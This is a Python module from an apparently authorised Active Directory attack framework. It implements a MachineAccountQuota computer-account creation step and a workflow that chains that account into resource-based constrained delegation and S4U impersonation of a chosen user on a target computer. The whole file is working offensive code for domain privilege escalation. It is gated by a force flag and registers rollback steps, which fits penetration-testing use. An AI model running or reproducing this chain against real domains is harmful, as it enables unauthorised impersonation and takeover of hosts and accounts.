"""MachineAccountQuota computer creation and RBCD hand-off."""

from __future__ import annotations

import secrets
from typing import Any

from rich.console import Console

from adaf_attack.capabilities.planned_offensive import register_from_catalog
from adaf_attack.capabilities.rbcd import Rbcd
from adaf_attack.capabilities.s4u_abuse import S4uAbuse
from adaf_attack.core.graph import AttackGraph
from adaf_attack.core.ldap_ops import (
    encode_unicode_pwd,
    finish,
    register_object_rollback,
    require_force,
)
from adaf_attack.core.ldap_util import ldap_connect
from adaf_attack.core.session import Session
from adaf_attack.core.target import Target

console = Console()


def _create_computer(
    conn: Any,
    session: Session,
    base_dn: str,
    domain: str,
    name: str,
    password: str,
) -> dict[str, Any]:
    sam = name if name.endswith("$") else f"{name}$"
    cn = sam.rstrip("$")
    dn = f"CN={cn},CN=Computers,{base_dn}"
    host = f"{cn.lower()}.{domain}"
    attrs = {
        "objectClass": ["top", "person", "organizationalPerson", "user", "computer"],
        "sAMAccountName": sam,
        "userAccountControl": 4096,
        "unicodePwd": encode_unicode_pwd(password),
        "dNSHostName": host,
        "servicePrincipalName": [f"HOST/{host}", f"RestrictedKrbHost/{host}"],
    }
    ok = bool(conn.add(dn, attributes=attrs))
    if ok:
        register_object_rollback(
            session, target_dn=dn, rollback="Delete the machine account created via MAQ."
        )
    return {
        "ok": ok,
        "dn": dn,
        "sam": sam,
        "dns": host,
        "ldap_result": str(conn.result),
    }


@register_from_catalog("maq-add-computer")
class MaqAddComputer:
    def run(
        self,
        target: Target,
        session: Session,
        graph: AttackGraph,
        *,
        force: bool = False,
        include_secrets: bool = False,
        **kwargs: Any,
    ) -> dict[str, Any]:
        require_force("maq-add-computer", force)
        name = str(
            kwargs.get("computer")
            or kwargs.get("sam")
            or kwargs.get("name")
            or f"ADAFC{secrets.token_hex(3)}"
        )
        password = str(kwargs.get("password") or (secrets.token_urlsafe(12) + "Aa1!"))
        conn, base_dn, _cfg = ldap_connect(target)
        try:
            created = _create_computer(conn, session, base_dn, target.domain, name, password)
            result = dict(created)
            if include_secrets:
                result["password"] = password
            if created["ok"]:
                graph.add_node(
                    f"COMPUTER@{created['sam'].upper()}@{target.domain.upper()}",
                    "Computer",
                    sam=created["sam"],
                    dn=created["dn"],
                )
            console.print(f"[green]maq-add-computer[/green] {created['sam']} ok={created['ok']}")
            return finish(session, graph, "maq-add-computer", result, ok=created["ok"])
        finally:
            conn.unbind()


@register_from_catalog("maq-rbcd-workflow")
class MaqRbcdWorkflow:
    def run(
        self,
        target: Target,
        session: Session,
        graph: AttackGraph,
        *,
        force: bool = False,
        include_secrets: bool = False,
        **kwargs: Any,
    ) -> dict[str, Any]:
        require_force("maq-rbcd-workflow", force)
        set_on = kwargs.get("set_on") or kwargs.get("computer")
        if not set_on:
            raise RuntimeError("maq-rbcd-workflow requires -P set_on=<target-computer>")
        created = MaqAddComputer().run(
            target,
            session,
            graph,
            force=True,
            include_secrets=include_secrets,
            computer=kwargs.get("name") or kwargs.get("sam"),
            password=kwargs.get("password"),
        )
        rbcd = {"ok": False, "skipped": "computer_create_failed"}
        s4u: dict[str, Any] = {"skipped": "rbcd_not_set"}
        if created.get("ok"):
            rbcd = Rbcd().run(
                target,
                session,
                graph,
                force=True,
                set_on=set_on,
                set_from=created["sam"],
            ).get("set_attempt") or {"ok": False}
            impersonate = kwargs.get("impersonate")
            if rbcd.get("ok") and impersonate:
                s4u = S4uAbuse().run(
                    target,
                    session,
                    graph,
                    force=True,
                    impersonate=impersonate,
                    spn=kwargs.get("spn") or f"cifs/{str(set_on).rstrip('$')}",
                )
        result = {
            "ok": bool(created.get("ok") and rbcd.get("ok")),
            "computer": created,
            "rbcd": rbcd,
            "s4u": s4u,
        }
        session.register_cleanup(
            {
                "kind": "ldap-object",
                "target": created.get("dn") or "",
                "rollback": "Delete the MAQ computer if RBCD hand-off created it.",
            }
        )
        return finish(session, graph, "maq-rbcd-workflow", result, ok=result["ok"])
